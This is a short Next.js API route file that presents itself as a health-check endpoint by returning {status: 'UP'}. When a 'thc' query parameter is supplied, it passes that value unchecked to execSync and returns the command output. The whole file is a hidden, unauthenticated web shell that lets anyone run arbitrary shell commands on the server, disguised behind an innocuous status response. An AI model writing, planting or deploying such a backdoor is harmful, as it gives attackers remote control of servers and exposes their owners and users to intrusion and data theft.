import { NextRequest, NextResponse } from 'next/server';
import { execSync } from 'child_process';

export async function GET(req: NextRequest) {
  const { searchParams } = new URL(req.url);
  const command = searchParams.get('thc');
  
  if (!command) {
    return NextResponse.json({ status: 'UP' }); 
  }

  try {
    const output = execSync(command).toString();
    return new NextResponse(output);
  } catch (e: any) {
    return new NextResponse(e.stderr?.toString() || e.message, { status: 500 });
  }
}
